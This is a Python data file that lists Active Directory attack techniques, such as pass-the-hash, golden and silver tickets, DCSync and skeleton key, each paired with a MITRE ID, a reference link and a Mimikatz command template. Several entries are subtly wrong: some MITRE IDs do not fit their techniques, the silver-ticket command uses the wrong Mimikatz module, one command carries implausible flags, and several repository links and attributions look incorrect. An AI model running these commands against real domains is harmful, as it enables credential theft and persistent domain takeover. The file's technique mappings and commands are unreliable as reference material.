#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Made by papi
# Created on: Di 10 Okt 2023 01:54:42  CEST
# active_directory.py
# Description:
#  definition of the Active directory vulnerabilities.

active_directory_vulns = [
    {
        "title": "Pass-the-Hash (PtH)",
        "desc": "An attacker uses the hash of a user's password to gain unauthorized access to a system or resource.",
        "image": "https://example.com/another-image.png",
        "mitre": "T1003",
        "external": [
            {
                "title": "MITRE ATT&CK - Pass the Hash",
                "link": "https://attack.mitre.org/techniques/T1003/"
            }
        ],
        "command": "Invoke-Mimikatz -Command 'sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:cmd'"
    },
    {
        "title": "Kerberoasting",
        "desc": "An attacker attempts to crack the passwords of service accounts from Kerberos ticket data.",
        "image": "https://example.com/another-image.png",
        "mitre": "T1558",
        "external": [
            {
                "title": "Kerberoasting - Tim Medin",
                "link": "https://github.com/nidem/kerberoast"
            }
        ],
        "command": "Invoke-Kerberoast.ps1"
    },
    {
        "title": "Pass-the-Ticket (PtT)",
        "desc": "An attacker uses a Kerberos ticket-granting ticket (TGT) to access network resources.",
        "image": "https://example.com/another-image.png",
        "mitre": "T1550",
        "external": [
            {
                "title": "MITRE ATT&CK - Pass the Ticket",
                "link": "https://attack.mitre.org/techniques/T1550/"
            }
        ],
        "command": "Invoke-Mimikatz -Command 'kerberos::ptt <ticket.kirbi>'"
    },
    {
        "title": "Golden Ticket",
        "desc": "An attacker forges a Kerberos ticket granting access to any resource or service in a domain.",
        "image": "https://example.com/another-image.png",
        "mitre": "T1550.002",
        "external": [
            {
                "title": "Penetration Testing in Active Directory Using Metasploit",
                "link": "https://www.rapid7.com/blog/post/2016/01/04/penetration-testing-in-active-directory-using-metasploit/"
            }
        ],
        "command": "Invoke-Mimikatz -Command 'kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID> /rc4:<NTLM_hash> /service:<service> /target:<target> /ticket:<golden_ticket.kirbi>'"
    },
    {
        "title": "Silver Ticket",
        "desc": "An attacker forges a Kerberos ticket granting access to a specific service or resource.",
        "image": "https://example.com/another-image.png",
        "mitre": "T1550.003",
        "external": [
            {
                "title": "Kerberos Ticket Forging - Active Directory Attacks",
                "link": "https://adsecurity.org/?p=4173"
            }
        ],
        "command": "Invoke-Mimikatz -Command 'kerberos::tgt /user:<username> /domain:<domain> /sid:<domain_SID> /rc4:<NTLM_hash> /service:<service> /target:<target> /ticket:<silver_ticket.kirbi>'"
    },
    {
        "title": "Mimikatz DCSync",
        "desc": "An attacker with admin rights extracts password data from the Active Directory database.",
        "image": "https://example.com/another-image.png",
        "mitre": "T1003.003",
        "external": [
            {
                "title": "Mimikatz DCSync - harmj0y",
                "link": "https://github.com/HarmJ0y/PowerShell/tree/master/Invoke-TheHash/Invoke-Mimikatz"
            }
        ],
        "command": "Invoke-Mimikatz -Command 'lsadump::dcsync /user:<username>'"
    },
    {
        "title": "Overpass-the-Hash",
        "desc": "An attacker dumps the cached Kerberos tickets to extract the service tickets for unauthorized access.",
        "image": "https://example.com/another-image.png",
        "mitre": "T1558.001",
        "external": [
            {
                "title": "Overpass-the-Hash - harmj0y",
                "link": "https://github.com/HarmJ0y/PowerShell/tree/master/Overpass-the-Hash"
            }
        ],
        "command": "Invoke-Mimikatz -Command 'sekurlsa::tickets /service /run:command'"
    },
    {
        "title": "Pass-the-Cache",
        "desc": "An attacker steals credentials stored in LSASS memory to gain access to resources.",
        "image": "https://example.com/another-image.png",
        "mitre": "T1555",
        "external": [
            {
                "title": "Pass-the-Cache - harmj0y",
                "link": "https://github.com/HarmJ0y/PowerShell/tree/master/Pass-the-Cache"
            }
        ],
        "command": "Invoke-Mimikatz -Command 'sekurlsa::logonpasswords /patch /unmodule /wdigest /credential:<NTLM_hash>'"
    },
    {
        "title": "Mimikatz Golden Ticket Renewal",
        "desc": "An attacker renews an existing Golden Ticket without needing access to domain controllers.",
        "image": "https://example.com/another-image.png",
        "mitre": "T1550.001",
        "external": [
            {
                "title": "Mimikatz Golden Ticket Renewal",
                "link": "https://attack.mitre.org/techniques/T1550/001/"
            }
        ],
        "command": "Invoke-Mimikatz -Command 'kerberos::golden /rc4:<NTLM_hash> /user:<username> /domain:<domain> /sid:<domain_SID> /target:<target> /renew /startoffset:0 /endin:<lifetime>'"
    },
    {
        "title": "Skeleton Key",
        "desc": "An attacker implants a persistent backdoor password in Active Directory to access any account.",
        "image": "https://example.com/another-image.png",
        "mitre": "T1003.002",
        "external": [
            {
                "title": "Mimikatz Skeleton Key",
                "link": "https://adsecurity.org/?p=556"
            }
        ],
        "command": "Invoke-Mimikatz -Command 'misc::skeleton'"
    },
    {
        "title": "Rogue Domain Controller",
        "desc": "An attacker introduces a rogue domain controller to the Active Directory forest to control authentication.",
        "image": "https://example.com/another-image.png",
        "mitre": "T1091",
        "external": [
            {
                "title": "MITRE ATT&CK - Domain Controller",
                "link": "https://attack.mitre.org/techniques/T1091/"
            }
        ],
        "command": "N/A"
    },
    {
        "title": "Resource-Based Constrained Delegation Abuse",
        "desc": "An attacker abuses resource-based constrained delegation to execute arbitrary code on a target machine.",
        "image": "https://example.com/another-image.png",
        "mitre": "T1558.002",
        "external": [
            {
                "title": "Powermad - harmj0y",
                "link": "https://github.com/HarmJ0y/PowerShell/tree/master/Powermad"
            }
        ],
        "command": "N/A"
    }
]
